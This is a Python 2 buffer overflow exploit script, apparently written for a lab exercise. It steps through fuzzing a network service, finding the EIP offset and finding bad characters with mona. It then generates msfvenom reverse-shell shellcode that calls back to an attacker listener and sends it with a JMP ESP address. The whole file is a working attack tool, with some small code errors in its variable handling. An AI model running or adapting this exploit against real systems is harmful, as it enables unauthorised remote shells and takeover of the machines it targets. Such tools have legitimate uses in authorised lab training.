#!/usr/bin/python
import sys, socket
import os
from time import sleep

#At end of each BOF, remember to reset RHOST/LHOST, cmd, esp, offset, and badchars.

################################### Variables ##################################
##Can support upto a length of 5000 bytes, if you need larger pattern, generate and add below
full_pattern = ""
approx_offset = 0
################################################################################
########################USER Settings###########################################
#Server response timeout, will be used to identify a crash.
timeout = 5
#Add vulnerable server's IP address and port to connect
addr = ('10.10.177.32',1337)
#Add command to send prepended to the buffer, eg. 'TRUN .' for vulnserver.exe
cmd = "OVERFLOW6 "
#your listener IP to get reverse shell, Required for the 'shell' step
lhost = "10.4.11.217"
lport = "4444"

#Default starting EIP offset is 50, change to correct EIP offset after fuzz step
offset = 50
buffer = "A" * offset

#Add bad characters to the list as you find them

bad = "\x00" ### When Resetting do **NOT** remove \x00, it will break the progream.

#Update JMP ESP address to the below before running 'shell'
esp = ""  
################################################################################
################################################################################

## ENGINE ##

def fuzz(addr,cmd,timeout):
	print "FUZZING %s " % str(addr)
	buffer = "A" * 50
	while True:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.settimeout(timeout)
			s.connect(addr)
			s.recv(1024)
			s.send(cmd + buffer)
			print "Sent buffer length -> " + str(len(buffer))
			s.close()
			sleep(1)
			buffer = buffer + "A" * 50
		except:
			print "Potential crash. Approximate Offset set to %s" % str(len(buffer))
			approx_offset = str(len(buffer))
			return approx_offset

	return approx_offset

def find_offset(addr,cmd,full_pattern,approx_offset,timeout):
	pattern = full_pattern[0:approx_offset]
	while True:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.settimeout(timeout)
			s.connect(addr)
			s.recv(1024)
			s.send(cmd + pattern)
			print "Sent pattern length -> " + str(len(pattern))
			s.close()
			sleep(1)
		except:
			print "To find the exact offset of EIP in Imunity, (Don't restart program) Run -> !mona findmsp -distance %s " % str(len(pattern))
			return
	return

def find_badchars(addr,cmd,bad,offset,timeout):
	buffer = "A" * int(offset) + "B" * 4
	badchars = ''
	h = [ord(c) for c in bad]
	for x in range(1, 256):
		if x not in h:
			badchars = badchars + "{:02x}".format(x)
	badchars = bytearray.fromhex(badchars)
	while True:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.settimeout(timeout)
			s.connect(addr)
			s.recv(1024)
			s.send(cmd + buffer + badchars)
			print "Sent badchars array excluding specified bad chars " + str(j)
			s.close()
			sleep(1)
		except:
			print "------------------------------------------------------------"
			print "Run -> !mona compare -f C:\\mona\\oscp\\bytearray.bin -a <ESP address> "
			print "Reset debugger and rerun module until all the chars in the stack are unmodified"
			print "-------------------------------------------------------------"
			print "Once all chars unmodified restart and run: !mona jmp -r esp -cpb \"%s\" " % j
			print "From log window select any jmp esp address. This address will be written in reverse per 2 characters ex/ 12345678 becomes x78\ x56\ x34\ x12 (without the spaces)."
			print "-------------------------------------------------------------"
			print "Restart program. Start nc listener and run: python semi-win32.py shell"
			return
	return

def shellcode(addr,cmd,lhost,lport,j,esp,timeout):
	nop = "\x90" * 16
	paygen = 'msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} EXITFUNC=thread -f python -a x86 -b \"{}\" > payload.py'.format(lhost,lport,j)
	print "Generating shellcode..."
	print(paygen)
	os.system(paygen)
	from payload import *
	while True:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.settimeout(timeout)
			s.connect(addr)
			s.recv(1024)
			s.send(cmd + buffer + esp + nop + buf)
			print "Sending shellcode with NOPs"
			s.close()
			sleep(1)
		except:
			print "Check listener for shell "
			return
########################
#For dispalying badchars in print messages
if len(bad) > 0:
	j = ''
	i = [ord(c) for c in bad]
	for x in range(0, 256):
		if x in i:
			j = j + "\\x{:02x}".format(x)

#########################


## MAIN

if len(sys.argv) < 2:
	print "Choose modules: fuzz / badchars / shell"
	print "Add the target address, port, command and execute. Example: python <filename>.py fuzz"
	sys.exit();

if sys.argv[1] == 'fuzz':
	approx_offset = int(fuzz(addr,cmd,timeout))
	print "Approximate offset is %s" % approx_offset
	raw_input("Restart the program and press any key to send pattern")
	find_offset(addr,cmd,full_pattern,approx_offset,timeout)
	print "Add the exact EIP offset to the offset variable in the code. Fuzzing completed. Restart program and Run -> semi-win32.py badchars"

if sys.argv[1] == 'badchars':
	print "Run -> !mona config -set workingfoldser c:\\mona\\%p "
	print "Run -> !mona bytearray -b \"%s\" " % j
	raw_input("Press any key to send the Badchar array")
	find_badchars(addr,cmd,bad,offset,timeout)


if sys.argv[1] == 'shell':
	if len(esp) > 0:
		shellcode(addr,cmd,lhost,lport,j,esp,timeout)
	else:
		print "To find 'JMP ESP' instruction, Run -> !mona jmp -r esp -cpb \"%s\" " % j
